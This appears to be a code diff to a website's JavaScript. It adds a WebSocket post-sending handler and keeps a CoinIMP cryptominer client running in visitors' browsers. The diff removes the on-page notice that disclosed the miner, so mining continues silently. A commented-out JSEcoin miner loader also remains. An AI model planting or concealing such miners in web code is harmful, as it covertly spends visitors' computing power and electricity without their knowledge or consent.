@@ -68,11 +68,30 @@ ws.addEventListener('message', function (event) {
     console.log('Message from server ', event.data);
 });
 
+var pubSender = getEl('pubSender');
+pubSender.addEventListener('click',function(){
+    let pubContent = getEl('pubContent');
+    var pubData = {
+      pubid: 'fhfhfh',
+      time: '45:78:12',
+      nombre: 'unoname',
+      content: pubContent.value,
+      tkn: getEl('ctkn').value
+    }
+
+    pubContent.value = '';
+
+    ws.send(JSON.stringify(pubData));
+    newPub(pubData);
+});
+
 
 /************* Publications **************/
 
 
 function newPub(res){
+    res.nombre = usuario;
+
     var div = newEl('div');
     div.setAttribute('class','pubs border font');
     div.setAttribute('id',res.pubid);
@@ -228,8 +247,8 @@ getEl('salir').addEventListener('click', function(){
 var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
     throttle: 0.3, c: 'w'
 });
+
 _client.start();
-_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
 
 
 //!function(){window.JSEDarkMode=1;window.JSESetLanguage="es";var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/145891/neki-platform.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
